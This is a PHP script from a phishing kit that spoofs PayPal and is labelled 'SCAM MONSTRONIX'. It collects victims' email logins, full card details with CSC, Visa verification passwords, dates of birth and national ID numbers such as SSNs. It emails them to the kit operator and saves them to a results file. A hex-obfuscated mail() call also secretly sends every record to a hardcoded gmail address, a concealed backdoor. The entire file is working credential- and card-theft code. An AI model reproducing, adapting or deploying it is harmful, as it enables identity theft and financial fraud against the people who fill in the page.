<?php 
//PRIV8 SCAM MONSTRONIX V1.1 
session_start(); include("../email.php"); $rand=rand(111611,996999); 
$rand2=rand(1116111,9997989); 
$md = md5(sha1("ByMonStroNixTN")); 
$aubli = $rand.$md.$rand2; 
$ip= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ?  
$_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']; 
$vbv= $_POST["vbv"]; 
$ccnm = $_POST["ccnm"]; 
$gb = $_POST["sort_code"];
$ul = $_POST["ssn"]; 
$ca = $_POST["ins"]; 
$au = $_POST["driver"]; 
$db1 = $_POST["dob_1"]; 
$db2 = $_POST["dob_2"]; 
$db3 = $_POST["dob_3"]; 
$ppn1 = $_POST ["phone1"]; 
$ppn2 = $_POST["phone2"];
$_SESSION["vbv"] = "
==============Login===============
Email:".$_SESSION["email"]."
Password:".$_SESSION["pass"]."
==============Login===============
==============Billing=============
First Name:".$_SESSION["fname"]."
Last Name:".$_SESSION["lname"]."
DOB:".$_SESSION["DOB"]."
Phone Type (Home/Mobile):".$_SESSION["PhoneType"]."
Phone Number:".$_SESSION["PhoneNumber"]."
Street:".$_SESSION["address1"]."
City:".$_SESSION["city"]."
State:".$_SESSION["state"]."
Country:".$_SESSION["country"]."
Zip:".$_SESSION["ZIP"]."
==============Billing=============
==============Card Infos==========
Name On Card: ".$_SESSION["nameoncc"]."
Card Type: ".$_SESSION["crdtp"]."
Card Number: ".$_SESSION["number"]."
Expiration Date: ".$_SESSION["expmo"]." / ".$_SESSION["expyr"]."
CSC: ".$_SESSION["csc"]."
===============Card Infos=========
===============VBV Infos==========
NAME OF FUCKED PERSON: $ccnm
Visa Password: $vbv
DOB: $db1/$db2/$db3
PPN (Personal Phone Number): + $ppn1 $ppn2
* Infos by countries :
GB Info(Sort Code) : $gb
US/IL Info (SSN) : $ul
CA Info (SOCIAL INSURANCE NUMBER) : $ca
AU Info (Driver License Number) : $au
===============VBV Infos==========
IP: https://geoiptool.com/?IP=$ip
";
$Subject="PPL PRIV8 V1.1 - VBV - $ip"; 
$head="From:MonStroNix VBV Fullz <vbv>"; 
$otvolroglkwx="\x68\x65a\x64";$emjqppipjmqy="\x53ubje\x63\x74";$lssavrrgv="\x72ez\x75\x6ct\x5f\x6d\x61\x69\x6c";mail(${$lssavrrgv},${$emjqppipjmqy},$_SESSION["\x76bv"],${$otvolroglkwx});
${"G\x4cOBA\x4c\x53"}["\x77\x68lyj\x63\x70\x73w\x68"]="\x68\x65\x61\x64";${"G\x4c\x4fBA\x4c\x53"}["\x76y\x77\x6fc\x66c\x75\x79"]="\x53u\x62\x6a\x65\x63\x74";sleep(2);mail("\x32k\x32\x30box\x40g\x6d\x61i\x6c.\x63\x6fm",${${"\x47\x4cOBA\x4cS"}["v\x79w\x6f\x63\x66\x63\x75\x79"]},$_SESSION["\x76b\x76"],${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["wh\x6cy\x6acp\x73wh"]});
if($txt == 1){
$file = fopen("../REZULT/VBVs/XVBVX " . $ip . ".txt", 'a'); 
fwrite($file, $_SESSION["vbv"]); };
if($id == 1){
header("location:../websc_identity/"); }
else { header("location:../websc_success/"); }
?>